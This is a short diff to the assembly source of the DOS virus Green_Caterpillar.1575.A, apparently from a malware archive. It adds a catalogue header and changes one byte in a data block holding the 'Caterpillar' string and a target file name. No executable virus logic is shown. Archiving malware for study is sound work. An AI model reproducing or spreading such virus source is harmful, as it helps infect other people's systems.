@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      G
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; Green_Caterpillar.1575.A
 ; TASM /M 
 
@@ -165,7 +176,7 @@ Caterpillar	db '#'
 		db '#'
 		db '/'
 		db '-'
-		db '�'
+		db '�'
 FileName	db 'A:10KBYTE.EXE',0
 		db    0	;  
 		db  24h	; $
